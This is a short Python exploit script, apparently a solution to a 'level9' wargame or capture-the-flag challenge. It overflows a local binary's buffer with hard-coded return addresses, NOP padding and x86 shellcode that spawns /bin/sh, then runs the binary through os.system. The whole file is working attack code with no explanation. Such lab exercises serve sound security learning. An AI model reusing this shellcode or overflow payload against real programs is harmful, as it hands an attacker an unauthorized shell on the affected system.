#!/usr/bin/python

import os

addr = "\x08\x04\xa0\x0c"[::-1]
shellcodeAddr = "\x08\x04\xa0\x10"[::-1]
shellcode = "\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"
args = shellcodeAddr + shellcode + (108 - len(shellcodeAddr) - len(shellcode))*"\x90" + addr
cmd = "/home/user/level9/level9 " + args
os.system(cmd)
